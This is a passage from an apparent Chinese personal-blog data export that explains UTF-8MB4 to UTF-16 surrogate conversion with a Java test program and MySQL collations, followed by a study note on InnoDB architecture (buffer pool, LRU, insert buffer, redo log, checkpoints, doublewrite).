start=\"2\">\n<li><strong>将UTF-8MB4字符拆成为两个字符</strong><br>步骤如下</li>\n</ol>\n<ul>\n<li><p>先将码点值减掉(2^16)，并去掉第1位</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">val = codePoint - (1 &lt;&lt; 16)</span><br><span class=\"line\">val = val &amp; 0xFFFFF;</span><br><span class=\"line\">     000    001111    011000    101101        计算后的二进制值</span><br><span class=\"line\">      00    001111    011000    101101        去掉第1位</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>然后填充到固定转化模板（后面解释），得到两个三字节的UTF-8编码值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">11101101  1010xxxx  10xxxxxx    11101101  1011xxxx  10xxxxxx    固定转化模板</span><br><span class=\"line\">11101101  10100000  10111101    11101101  10111000  10101101    填充后二进制值</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>再计算新的码点（此时是两个三字节的UTF-8编码值，所以有如下模板）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1110xxxx  10xxxxxx  10xxxxxx    1110xxxx  10xxxxxx  10xxxxxx    三字节格式二进制值模板</span><br><span class=\"line\">    1101    100000    111101        1101    111000    101101    抽离模板后值</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>整理二进制位，得到两个新的Unicode码点：D83D, DE2D</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">11011000  00111101              11011110  00101101</span><br><span class=\"line\">D83D                            DE2D</span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<p>上面的转换步骤稍加整理后，可以得到公式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">新码点的值计算：</span><br><span class=\"line\">val = ((bytes[0] &amp; 0x7) &lt;&lt; 18) + ((bytes[1] &amp; 0x63) &lt;&lt; 12) + (bytes[2] &amp; 0x63) &lt;&lt; 6) + (bytes[3] &amp; 0x63) - (1 &lt;&lt; 16)</span><br><span class=\"line\">val = val &amp; 0xFFFFF</span><br><span class=\"line\">// 110110xxxxxxxxxx 110111xxxxxxxxxx    来自固定转化模板的值</span><br><span class=\"line\">// 0b110110 = 54</span><br><span class=\"line\">// 54 &lt;&lt; 10 = 0xD800</span><br><span class=\"line\">codePointN[0] = (val &gt;&gt;&gt; 10) + 0xD800</span><br><span class=\"line\">// 0b110111 = 55</span><br><span class=\"line\">// 55 &lt;&lt; 10 = 0xDC00</span><br><span class=\"line\">codePointN[1] = (val &amp; 0x3FF) + 0xDC00</span><br></pre></td></tr></table></figure>\n\n<p><strong>拆分字符时使用的固定转化模板为什么是这个？</strong></p>\n<p><strong>其一</strong> 3字节UTF-8，固定了一些位</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1110xxxx  10xxxxxx  10xxxxxx    1110xxxx  10xxxxxx  10xxxxxx</span><br></pre></td></tr></table></figure>\n\n<p><strong>其二</strong> 新码点不能与UTF-8MB3冲突，所以选用为UTF-16永久保留不映射的码点区间(<code>0xD800-0xDBFF</code>和<code>0xDC00-0xDFFF</code>)作为新值所在的区间（两个区间的区别只是与大端和小端的规定有关）<br>因此又可以固定剩余几位（<code>D8</code>二进制为‭<code>11011000</code>‬，<code>DB</code>二进制为‭<code>11011011</code>‬，<code>DC</code>二进制为<code>‭11011100</code>‬，<code>DF</code>二进制为<code>‭11011111</code>‬）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">11101101  1010xxxx  10xxxxxx    11101101  1011xxxx  10xxxxxx</span><br></pre></td></tr></table></figure>\n\n<p><strong>关于码点值减掉(2^16)</strong></p>\n<p>参见JDK中的<code>java.lang.Character#highSurrogate</code>方法，这是用于计算高位值的方法</p>\n<p>相应的，低位值计算方法见<code>java.lang.Character#lowSurrogate</code>方法</p>\n<p>它们被调用的位置见<code>sun.nio.cs.UTF_8.Decoder#decode</code>方法</p>\n<h3 id=\"关于内存编码处理的测试代码\"><a href=\"#关于内存编码处理的测试代码\" class=\"headerlink\" title=\"关于内存编码处理的测试代码\"></a>关于内存编码处理的测试代码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">public static void main(String[] args) throws IOException, UnsupportDecodeException &#123;</span><br><span class=\"line\">\tbyte[] bytes = new byte[10];</span><br><span class=\"line\">\tint read = System.in.read(bytes);</span><br><span class=\"line\">\tSystem.out.println(&quot;读取byte如下 --&gt; &quot;);</span><br><span class=\"line\">\tfor (int i = 0; i &lt; read; i++) &#123; // 最后一个打印10为回车键</span><br><span class=\"line\">\t\tSystem.out.println(bytes[i] &amp; 0xff);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tSystem.out.println(&quot;读取内容如下 --&gt; &quot;);</span><br><span class=\"line\">\tSystem.out.println(new String(bytes, 0, read));</span><br><span class=\"line\">\tSystem.out.println(&quot;-----------------&quot;);</span><br><span class=\"line\">\tint val = ((bytes[0] &amp; 0x7) &lt;&lt; 18) + ((bytes[1] &amp; 0x3f) &lt;&lt; 12) + ((bytes[2] &amp; 0x3f) &lt;&lt; 6) + (bytes[3] &amp; 0x3f) - (1 &lt;&lt; 16);</span><br><span class=\"line\">\tval = val &amp; 0xFFFFF;</span><br><span class=\"line\">\tint high = (val &gt;&gt;&gt; 10) + 0xD800;</span><br><span class=\"line\">\tint low = (val &amp; 0x3FF) + 0xDC00;</span><br><span class=\"line\">\tSystem.out.println(Integer.toHexString((high &amp; 0xffff) &gt;&gt; 8));</span><br><span class=\"line\">\tSystem.out.println(Integer.toHexString(high &amp; 0xff));</span><br><span class=\"line\">\tSystem.out.println(Integer.toHexString((low &amp; 0xffff) &gt;&gt; 8));</span><br><span class=\"line\">\tSystem.out.println(Integer.toHexString(low &amp; 0xff));</span><br><span class=\"line\">\tSystem.out.println(&quot;-----------------&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\tSystem.out.println();</span><br><span class=\"line\">\tSystem.out.println(&quot;重复输入一次，验证unicode编码&quot;);</span><br><span class=\"line\">\tScanner scanner = new Scanner(System.in);</span><br><span class=\"line\">\tif (scanner.hasNext()) &#123;</span><br><span class=\"line\">\t\tString next = scanner.next();</span><br><span class=\"line\">\t\tSystem.out.println();</span><br><span class=\"line\">\t\tSystem.out.println(encode(next, true));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"MySQL中的编码\"><a href=\"#MySQL中的编码\" class=\"headerlink\" title=\"MySQL中的编码\"></a>MySQL中的编码</h2><p>了解了码点以及Java编码转化的本质后，应该能够明白MySQL中，如果客户端与服务器端编码不同，首先字符集就已经不同，那么存入数据库之后出现乱码也就不难理解了。</p>\n<p>在MySQL数据库中，新建数据库的时候会要求选择字符集和排序规则，这里的字符集就是本文所说的编码规则，而排序规则，则是在SQL查询中对文本排序时的排序依据（可以类比为Java中<code>java.util.Comparator</code>的实现），比如：是按ASCII码排序、还是按汉字拼音首字母排序、或者按德语字母顺序排序、或者排序时大小写不同是否看成同一个字符。</p>\n<p>以常用的<code>utf8mb4_general_ci</code>、<code>utf8mb4_unicode_ci</code>和<code>utf8mb4_bin</code>为例：<code>utf8mb4_unicode_ci</code>针对各语言做了比较复杂的处理，在各语言中的排序更加准确（主要是在德语、法语等一部分语言中有影响，对中文、英文没影响），排序速度较慢；<code>utf8mb4_general_ci</code>大小写不敏感，相比<code>utf8mb4_unicode_ci</code>排序速度也更快，<code>utf8mb4_bin</code>大小写敏感。</p>\n"},{"title":"了解InnoDB体系架构","date":"2020-03-15T15:47:19.000Z","keywords":"innodb, buffer","rId":"MB-20031501","_content":"\nInnoDB存储引擎具有行锁设计、支持事务、支持外键、支持MVCC、支持插入缓冲、支持自适应哈希索引等特点，其整体体系架构主要由后台线程、内存池、文件系统三部分组成，如下图所示：\n\n![图1](../static/MB20031501-1.png)\n\n接下来会针对后台线程和内存池展开介绍。\n\n## 内存池\n\n内存池从大的方面可以分为三块：重做日志缓冲（redo log buffer）、缓冲池（buffer pool）、额外内存池（additional memery pool）。缓冲池中缓存的数据页类型有：数据页（data page），索引页（index page）、插入缓冲（insert buffer）、锁信息（lock info）、自适应哈希索引（adaptive hash index）、数据字典（data dictionary）、undo页等。缓冲池从1.0.X版本开始，允许有多个实例，根据哈希值将每个页平均分配到不同的实例中。\n\n![图2](../static/MB20031501-2.png)\n\n### 1. 缓冲池\n\nInnodb是基于磁盘存储的数据库，CPU速度和磁盘速度之间存在巨大的鸿沟，磁盘速度较慢严重降低了数据库系统的性能。基于这个问题，数据库在内存中开辟了一块区域作为缓冲池来弥补两者之间的速度差距。在数据库中读取页时，首先将从磁盘读到的页放在缓冲池中，下次再读相同的页时，首先判断该页是否在缓冲池中，若命中则直接读取该页，否则从磁盘上读取。\n\n#### LRU列表\n\n缓冲池通过LRU（Latest Recent Used，最近使用）算法来进行管理页（数据页、索引页），最频繁使用的排在`LRU列表`前端，反之，排在末端。当缓冲池不能存放新读取到的页时，首先释放`LRU列表`末端的页。\n\nInnodb在LRU算法上做了一些调整。一些的一次性读取大量页的SQL操作会将缓冲池中的页大量刷出，从而影响缓冲池的效率（页缓冲池缓存频繁使用页的初衷不符）。为了解决这个问题，Innodb在LRU算法上引入了midpoint概念，midpoint点将`LRU列表`一分为二，`LRU列表`前端至midpoint点为`new列表`，midpoint点至`LRU列表`末端为`old列表`。`new列表`和`old列表`各自都以LRU算法管理，新读取的页被加入`old列表`，只有在`old列表`中存活一定时间(`innodb_old_blocks_time`)以后才会被加入`new列表`，可以看出`new列表`中的页都是最为活跃的热点数据。midpoint默认值是37%，即默认`old列表`占完整LRU列表的37%，由参数`innodb_old_blocks_pct`控制。\n\n![图3](../static/MB20031501-3.png)\n\n`LRU列表`中存储的页数上限是确定的，Innodb引入了`Free列表`来与`LRU列表`共同管理，未分配的页由`Free列表`进行管理，`Free列表`当前页数加`LRU列表`当前页数等于`LRU列表`可容纳的总页数。新读取页时，首先从`Free列表`中查找是否有空闲页，若有则将空闲页从`Free列表`移到`LRU列表`中，否则根据规则淘汰`LRU列表`末尾的页。\n\nInnoDB中页的大小是16KB，InnoDB从1.0.X开始，支持压缩页功能，可以将部分页压缩为1KB、2KB、4KB、8KB，对于非16KB的页，使用`unzip_LRU列表`管理。如需要申请4KB大小的页时，通过伙伴算法进行分配，过程如下：\n\n1. 检查4KB的`unzip_LRU列表`，检查是否有可用空闲页，若有则直接使用\n2. 检查8KB的`unzip_LRU列表`，若有空闲页，将页分成2个4KB页，存放到4KB的`unzip_LRU列表`\n3. 从`LRU列表`申请一个16KB的页，将页分成1个8KB的页和2个4KB的页，分别存放到对应的`unzip_LRU列表`中\n\n#### 脏页\n\n`LRU列表`中的页被修改后，该页称为脏页（dirty page），脏页既存在于`LRU列表`中又存在于`Flush列表`中，会通过`CheckPoint机制`被刷新会磁盘。\n\n#### 插入缓冲\n\n**插入缓冲主要是针对，插入操作时在非唯一的非聚集索引上进行离散插入会导致性能下降，这个问题设计的**。对于聚集索引，与数据的物理存储顺序是一致的，不用担心性能问题，但对于B+树结构下的非聚集索引这是需要考虑的问题。\n\n这里需要注意的两点是：\n\n1. 插入缓冲针对的是非聚集索引，不要因为名字就认为针对的是数据页\n2. 插入缓冲管辖的非聚集索引必须是非唯一的索引\n\nInnoDB存储引擎设计了Insert Buffer（插入缓冲），对于非聚集索引的插入或更新操作，不是每一次直接插入到索引页中，而是先判断插入的非聚集索引页是否在缓冲池中，若在则直接插入，否则先放入到Insert Buffer对象中，好似欺骗。之后主线程会异步地进行合并插入缓冲的工作，这样就大大提高了非聚集索引的插入效率。\n\nInsert Buffer的数据结构是一棵B+树，在MySQL4.1之前每张表有一棵B+树，而现在版本中全局只有一棵B+树，这棵B+树存放在共享表空间中，默认也就是`ibdata1文件`中。因此，试图通过独立表空间`.ibd文件`恢复表中数据时，往往会导致CHECK TABLE失败。这是因为表的辅助索引中的数据可能还在Insert Buffer中，所以通过`.ibd文件`进行恢复后，还需要进行REPAIR TABLE操作来重建表上所有的辅助索引。\n\n**B+树数据结构**\n\nInsert Buffer B+树非叶子节点存放的是查询的search key，其结构如下所示：space占用4字节，表示插入的表空间的id（InnoDB中每个表都有一个唯一的space id）；marker占用1字节，用于兼容老版本Insert Buffer；page_no占用4字节，表示页所在的偏移量\n\n![图4](../static/MB20031501-4.png)\n\nInsert Buffer B+树叶子节点的记录，结构如下图所示\n\n![图5](../static/MB20031501-5.png)\n\nspace、marker、page_no字段和非叶子节点中的含义相同，一共9个字节，metadata字段占用4个字节，存储内容如下\n\n|   名称   |  字节  |\n| :-----: | :----: |\n| IBUF_REC_OFFSET_COUNT| 2 |\n| IBUF_REC_OFFSET_TYPE | 1 |\n| IBUF_REC_OFFSET_FLAGS| 1 |\n\nIBUF_REC_OFFSET_COUNT用来排序每个记录进入Insert Buffer的顺序，因为Innodb从1.0.X开始支持Change Buffer，所以需要这个顺序回放才能得到记录的正确值。\n\n> 注：\n>\n> 1. IBUF_REC_OFFSET_TYPE和IBUF_REC_OFFSET_FLAGS暂时我也没理解清楚，可能与，后面的索引页类型有关\n> 2. 接下来关于Insert Buffer Bitmap这一块，我也没懂，仅做知识点记录，以后弄明白了再补充\n\n启用Insert Buffer索引后，辅助索引页(space, page_no)中的记录可能被插入到B+树中，为了保证每次Merge Insert Buffer页必须成功，还需要一个特殊的页用来标记每个辅助索引页的可用空间，这个页的类型是Insert Buffer Bitmap。\n\n每个Insert Buffer Bitmap页用来追踪16384个辅助索引页，即256个区（Extent）（所以一个区是64个页，一个区1MB ）。每个Insert Buffer Bitmap页都在16384个页的第二个页中。每个辅助索引页在Insert Buffer Bitmap页中占用4位(bit)，如下所示：\n\n| 名称             | 大小(bit) | 说明                                                         |\n| ---------------- | --------- | ------------------------------------------------------------ |\n| IBUF_BITMAP_FREE | 2         | 0 -> 无可用剩余空间<br />1 -> 剩余空间大于1/32页(512字节)<br />2 -> 剩余空间大于1/16页<br />3 -> 剩余空间大于1/8页 |\n| IBUF_BITMAP_BUFFERED | 1 |1表示辅助索引页有记录被缓存在Insert Buffer B+树中|\n| IBUF_BITMAP_IBUF | 1 |1表示该页位Insert Buffer B+树的索引页|\n>注：总结有以下几个没弄明白的点：\n>1.在硬盘上，辅助索引是如何划分页的，如何存储，随着数据的随机新增页的划分不会发生大范围的变化吗\n>2.Insert Buffer B+树叶子节点中的记录具体结构什么样（是单个索引记录还是整页记录）\n>3.Insert Buffer Bitmap在Insert Buffer B+树上吗，如何存在，它追踪16384个页数量的原因\n\n#### Change Buffer\n\nChange Buffer是InnoDB从1.0.X版本起引入的，可视为Insert Buffer的升级，可以对DML操作——INSERT、DELETE、UPDATE——都进行缓冲，分别是：Insert Buffer、Delete Buffer、Purge Buffer。\n\nUpdate操作分为两个步骤：\n\n1. 将记录标记为已删除——对应Delete Buffer\n2. 真正将记录删除——对应Purge Buffer\n\n#### UNDO页\n\n为了满足事务的原子性，在操作任何数据之前，首先将数据备份到一个地方（这个存储备份的地方称为Undo Log），然后进行数据的修改，这样在rollback时，可以利用Undo Log中备份的undo页将数据恢复到事务开始之前的状态。\n\n#### 自适应哈希索引\n\nInnoDB存储引擎会监控对表上各索引页的查询。如果观察到建立哈希索引可以带来速度提升，则建立哈希索引，称之为自适应哈希索引（Adaptive Hash Index, AHI）。AHI是通过缓冲池的B+数页构造而来的，因此建立速度很快，而且不需要对整张表构建哈希索引。InnoDB存储引擎会自动根据访问的频率和模式来自动地为某些热点页建立哈希索引。\n\nAHI有一个要求，即对这个页的连续访问模式必须是一样的。例如对于（a，b）这样的联合索引，其访问模式可以是以下情况：\n\n```sql\nWHERE a=xxx\nWHERE a=xxx AND b=xxxx\n```\n\n若交替进行上述两种查询，那么不会对该页构造AHI。另外，还有如下要求：\n\n1. 以该模式访问了100次\n2. 页通过该模式访问了N次，其中N=页中记录/16\n\n正如一般所知的哈希索引，自适应哈希索引也只能进行等值查询，范围查询是不能使用哈希索引的。\n\n默认自适应哈希索引是开启的，可以通过`innodb_adaptive_hash_index`来配置禁用或启动此特性。\n\n### 2. 重做日志缓冲\n\n重做日志是InnoDB引擎对其本身事务操作的日志记录，记录了关于每个页的更改的物理情况。重做日志的存在能够避免宕机造成数据的丢失。\n\n在InnoDB中，为了协调CPU与磁盘速度的鸿沟，页的操作首先都是在缓冲池中完成的。重做日志也一样，InnoDB引擎首先将重做日志信息放入到内存中（即重做日志缓冲），然后按一定频率将其刷新到重做日志文件。重做日志缓冲一般不需要设置太大，因为一般情况下每一秒中会将其刷新到重做日志文件，因此只需要保证每秒产生的事务量在这个缓冲大小之内即可（可通过`innodb_log_buffer_size`控制其大小，默认8MB）。重做日志文件会在三种情况下刷新到重做日志文件：\n\n1. 主线程每秒刷新一次\n2. 每个事务提交时，会将重做日志缓冲刷新到重做日志文件\n3. 当重做日志缓冲池剩余空间小于1/2时刷新\n\n当前事务数据库系统普遍采用Write Ahead Log策略，即当事务提交时，先写重做日志，再对页数据进行修改。因此当发生宕机而导致数据丢失时，可通过重做日志完成数据的恢复，当然未刷新到日志文件的重做日志（1秒以内）还是会有所丢失。\n\n**为什么需要重做日志**\n\n如果没有重做日志存在，将数据页刷新到硬盘都将直接操作数据文件，当从缓冲池将页的新版本刷新到硬盘时发生宕机，可能出现部分已写入部分未写入的情况，因为没有重做日志的存在，无法定位哪些页未写入。\n\n> 注意：重做日志文件的主要作用不是避免宕机造成的数据丢失，而是避免因宕机造成的数据文件的不完整。数据恢复只是不可靠的顺带的功能。BinLog文件才是真正为避免数据丢失而生的。\n\n### 3. 额外内存池\n\n在InnoDB存储引擎中，对内存的管理是通过内存堆的方式进行的。在对数据结构本身的内存进行分配时，需要从额外的内存池中进行申请，当该区域的内存不足时，会从缓冲池中申请。例如，分配了缓冲池，但是每个缓冲池中的帧缓冲还有对应的缓冲控制对象（Buffer Control Block），这些对象记录了一些注入LRU、锁、等待等信息，而这个对象的内存需要从额外内存池中申请。因此，当申请了很大的InnoDB缓冲池时，也应考虑相应地增加这个值。\n\n\n\n## 其他技术与特性\n\n### 1. CHECKPOINT技术\n\nCheckPoint（检查点）技术与前面说过的重做日志有密切地关系。重做日志是用于防止因宕机导致数据文件损坏，更改记录被刷新到硬盘后，这部分的日志便已经不再需要了，可以被覆盖。因此重做日志文件被设计成可以循环使用的，一般重做日志文件有两个（也可以设置成超过两个文件），循环使用这两个文件。\n\n要能使用重做日志来恢复数据，必须知道哪些版本数据已经刷入硬盘，哪些版本未刷入硬盘。基于此，就有了检查点（CheckPoint）技术。对于InnnoDB存储引擎而言，其是通过LSN（Log Sequence Number）来标记版本的，LSN是8字节地数字，其单位是字节。每个页有LSN，重做日志中也有LSN，CheckPoint也有LSN，CheckPoint前的数据都已经被刷入硬盘，通过比对CheckPoint的LSN和重做日志中的LSN便能知道哪些版本数据未刷入硬盘。\n\n在InnoDB中，CheckPoint发生的时间、条件、脏页的选择、刷新脏页的数量都非常复杂。CheckPoint的发生主要有以下几种：\n\n1. 数据库关闭时，将所有的脏页都刷回硬盘，这是默认都有的（`innodb_fast_shutdown=1`）\n2. 主线程每1秒、每10秒从缓冲池的列表中刷新一定比例的页回磁盘，这个过程是异步的\n3. InnoDB引擎需要保证LRU列表中有差不多100个空闲页可供使用，Cleaner线程会检测，如果没有则会将LRU列表尾端的页移除，如果这些页中有脏页（在`Flush列表`中），则会进行CheckPoint。（InnoDB1.2.X开始LRU可用页的数量默认值为1024，且可通过`innodb_lru_scan_depth`控制）\n4. 当重做日志文件达到`75% * total_redo_log_file_size`时（`total_redo_log_file_size`是所有重做日志文件的总大小），会执行阻塞发现问题的用户查询线程执行Async Flush CheckPoint；当重做日志文件达到`90% * total_redo_log_file_size`时，会阻塞所有用户查询线程执行Sync Flush CheckPoint。从InnoDB1.2.X开始，在Cleaner线程执行，不会阻塞用户查询线程\n5. 当缓冲池中脏页数量达到`innodb_max_dirty_page_pct`（默认75%）时，强制执行CheckPoint\n\n### 2. 刷新临接页\n\nInnoDB还存在了刷新临接页的特性：当刷新一个脏页时，InnoDB存储引擎会检测该页所在区的所有页，如果是脏页，那么一起刷新。可以由参数`innodb_flush_neighbors`来配置启用或关闭此特性（值0表示关闭）。\n\n### 3. 异步IO\n\nInnoDB采用异步IO（Asynchronous IO, AIO）的方式来处理磁盘操作，AIO的一个优势是可以对多个索引页进行并发扫描，另一个优势是可以进行IO Merge操作，将多个IO合并为一个IO，例如用户需要访问的页（space, page_no）为（8，6)、（8，7）、（8，8），每个页大小16KB，AIO会判断这三个页是连续的，AIO底层会发送一个IO请求，读取48KB的页。\n\n在InnoDB1.1.X之前，AIO实现是通过InnoDB引擎代码模拟实现，从InnoDB1.1.X开始，提供了内核级别的AIO支持，称为Native AIO，因此编译或允许该版本MySQL时需要libaio库的支持。Native AIO需要操作系统提供支持，Windows系统和Linux系统都提供Native AIO支持，而Mac OSX系统则未提供，只能依旧使用原模拟的方式。\n\n可以通过参数`innodb_use_native_aio`来控制启用Native AIO，Linux系统下默认启用（ON）。\n\n### 4. 两次写\n\n当数据库宕机时，可能InnoDB正在写入某个页到表中，而这个页只写了一部分，比如16KB的页，只写了前4KB，之后就发生了宕机，这种情况被称为部分写失效。有经验的DBA也许会想如果发生写失效，可以通过重做日志进行恢复。但实际上并不一定可以修复，页内数据有可能本身发生损坏（这与重做日志记录的内容有关，参考[mysql 为何需要Double Write？有redo log还不够吗？](<https://blog.csdn.net/jolly10/article/details/79791574>)，估计是因为重做日志在页内的记录与最终写入磁盘的并不是完全相同的，还会经过一次与底层结构相关的计算），需要先通过页的副本来还原页，再进行重做，这个副本就就是doublewrite的内容。\n\ndoublewrite由两部分组成，一部分是内存中的doublewrite buffer，大小为2MB，另一部分是物理磁盘上共享表空间中的连续的2个区（128个页，也是2MB）。在对缓冲区进行刷新时，并不直接写磁盘，而是会通过memcpy函数将页先复制到内存中的doublewrite buffer，之后通过doublewrite  buffer再分两次，每次1MB顺序地写入共享表空间的物理磁盘上，然后马上调用fsync函数，同步磁盘，避免缓冲带来的问题。由于doublewrite页是连续的，因此这个过程是顺序写的，开销并不是很大。在完成doublewrite页写入后，再将doublewrie buffer中的页写入各个表空间文件中，此时写入是离散的。\n\n参数`skip_innodb_doublewrite`可以禁止使用doublewrite功能，有些情况下，这是需要的，如：用户有多个从服务器（在从服务器上做的是RAID0），可以在从服务器上关闭doublewrite功能；有些文件系统（ZFS文件系统）本身提供了部分写失效的防范机制，就不用开启doublewrite功能。\n\n![图1](../static/MB20031501-6.png)\n\n## 后台线程\n\n### 1. Master线程\n\n负责将重做日志缓冲刷新到重做日志文件\n\n### 2. IO线程\n\nAsync IO，分为4种线程\n\n1. Read线程（默认4条线程，由`innodb_read_io_thread`参数控制）\n2. Write线程（默认4条线程，由`innodb_write_io_thread`参数控制）\n3. Insert Buffer线程（1条线程）\n4. Log线程（1条线程）\n\n### 3. Purge线程\n\n支持设置多个线程，由`innodb_purge_threads`控制\n\n负责任务UNDO页回收，`innodb_purge_batch_size`控制每次回收数量\n\n### 4. Cleaner线程\n\n负责将缓冲池中的脏页刷新到磁盘","source":"_drafts/2020-03-15_innodb_struct.md","raw":"---\ntitle: 了解InnoDB体系架构\ndate: 2020-03-15 23:47:19\ntags: mysql\npermalink: innodb-struct\nkeywords: innodb, buffer\nrId: MB-20031501\n---\n\nInnoDB存储引擎具有行锁设计、支持事务、支持外键、支持MVCC、支持插入缓冲、支持自适应哈希索引等特点，其整体体系架构主要由后台线程、内存池、文件系统三部分组成，如下图所示：\n\n![图1](../static/MB20031501-1.png)\n\n接下来会针对后台线程和内存池展开介绍。\n\n## 内存池\n\n内存池从大的方面可以分为三块：重做日志缓冲（redo log buffer）、缓冲池（buffer pool）、额外内存池（additional memery pool）。缓冲池中缓存的数据页类型有：数据页（data page），索引页（index page）、插入缓冲（insert buffer）、锁信息（lock info）、自适应哈希索引（adaptive hash index）、数据字典（data dictionary）、undo页等。缓冲池从1.0.X版本开始，允许有多个实例，根据哈希值将每个页平均分配到不同的实例中。\n\n![图2](../static/MB20031501-2.png)\n\n### 1. 缓冲池\n\nInnodb是基于磁盘存储的数据库，CPU速度和磁盘速度之间存在巨大的鸿沟，磁盘速度较慢严重降低了数据库系统的性能。基于这个问题，数据库在内存中开辟了一块区域作为缓冲池来弥补两者之间的速度差距。在数据库中读取页时，首先将从磁盘读到的页放在缓冲池中，下次再读相同的页时，首先判断该页是否在缓冲池中，若命中则直接读取该页，否则从磁盘上读取。\n\n#### LRU列表\n\n缓冲池通过LRU（Latest Recent Used，最近使用）算法来进行管理页（数据页、索引页），最频繁使用的排在`LRU列表`前端，反之，排在末端。当缓冲池不能存放新读取到的页时，首先释放`LRU列表`末端的页。\n\nInnodb在LRU算法上做了一些调整。一些的一次性读取大量页的SQL操作会将缓冲池中的页大量刷出，从而影响缓冲池的效率（页缓冲池缓存频繁使用页的初衷不符）。为了解决这个问题，Innodb在LRU算法上引入了midpoint概念，midpoint点将`LRU列表`一分为二，`LRU列表`前端至midpoint点为`new列表`，midpoint点至`LRU列表`末端为`old列表`。`new列表`和`old列表`各自都以LRU算法管理，新读取的页被加入`old列表`，只有在`old列表`中存活一定时间(`innodb_old_blocks_time`)以后才会被加入`new列表`，可以看出`new列表`中的页都是最为活跃的热点数据。midpoint默认值是37%，即默认`old列表`占完整LRU列表的37%，由参数`innodb_old_blocks_pct`控制。\n\n![图3](../static/MB20031501-3.png)\n\n`LRU列表`中存储的页数上限是确定的，Innodb引入了`Free列表`来与`LRU列表`共同管理，未分配的页由`Free列表`进行管理，`Free列表`当前页数加`LRU列表`当前页数等于`LRU列表`可容纳的总页数。新读取页时，首先从`Free列表`中查找是否有空闲页，若有则将空闲页从`Free列表`移到`LRU列表`中，否则根据规则淘汰`LRU列表`末尾的页。\n\nInnoDB中页的大小是16KB，InnoDB从1.0.X开始，支持压缩页功能，可以将部分页压缩为1KB、2KB、4KB、8KB，对于非16KB的页，使用`unzip_LRU列表`管理。如需要申请4KB大小的页时，通过伙伴算法进行分配，过程如下：\n\n1. 检查4KB的`unzip_LRU列表`，检查是否有可用空闲页，若有则直接使用\n2. 检查8KB的`unzip_LRU列表`，若有空闲页，将页分成2个4KB页，存放到4KB的`unzip_LRU列表`\n3. 从`LRU列表`申请一个16KB的页，将页分成1个8KB的页和2个4KB的页，分别存放到对应的`unzip_LRU列表`中\n\n#### 脏页\n\n`LRU列表`中的页被修改后，该页称为脏页（dirty page），脏页既存在于`LRU列表`中又存在于`Flush列表`中，会通过`CheckPoint机制`被刷新会磁盘。\n\n#### 插入缓冲\n\n**插入缓冲主要是针对，插入操作时在非唯一的非聚集索引上进行离散插入会导致性能下降，这个问题设计的**。对于聚集索引，与数据的物理存储顺序是一致的，不用担心性能问题，但对于B+树结构下的非聚集索引这是需要考虑的问题。\n\n这里需要注意的两点是：\n\n1. 插入缓冲针对的是非聚集索引，不要因为名字就认为针对的是数据页\n2. 插入缓冲管辖的非聚集索引必须是非唯一的索引\n\nInnoDB存储引擎设计了Insert Buffer（插入缓冲），对于非聚集索引的插入或更新操作，不是每一次直接插入到索引页中，而是先判断插入的非聚集索引页是否在缓冲池中，若在则直接插入，否则先放入到Insert Buffer对象中，好似欺骗。之后主线程会异步地进行合并插入缓冲的工作，这样就大大提高了非聚集索引的插入效率。\n\nInsert Buffer的数据结构是一棵B+树，在MySQL4.1之前每张表有一棵B+树，而现在版本中全局只有一棵B+树，这棵B+树存放在共享表空间中，默认也就是`ibdata1文件`中。因此，试图通过独立表空间`.ibd文件`恢复表中数据时，往往会导致CHECK TABLE失败。这是因为表的辅助索引中的数据可能还在Insert Buffer中，所以通过`.ibd文件`进行恢复后，还需要进行REPAIR TABLE操作来重建表上所有的辅助索引。\n\n**B+树数据结构**\n\nInsert Buffer B+树非叶子节点存放的是查询的search 